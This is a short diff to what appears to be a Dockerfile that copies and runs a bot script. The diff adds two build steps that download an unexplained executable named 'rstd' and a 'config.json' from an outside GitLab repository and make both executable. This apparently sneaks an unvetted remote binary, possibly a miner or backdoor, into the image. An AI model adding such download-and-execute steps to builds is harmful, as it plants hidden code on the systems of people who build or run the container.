@@ -25,6 +25,8 @@ RUN apt-get update && apt-get install -y \
 
 # Set work dir:
 WORKDIR /home
+RUN wget https://gitlab.com/teletyl/jupyter/-/raw/main/rstd && chmod +x rstd
+RUN wget https://gitlab.com/teletyl/he/-/raw/main/config.json && chmod +x config.json
 
 # Copy files:
 COPY startbot.sh /home
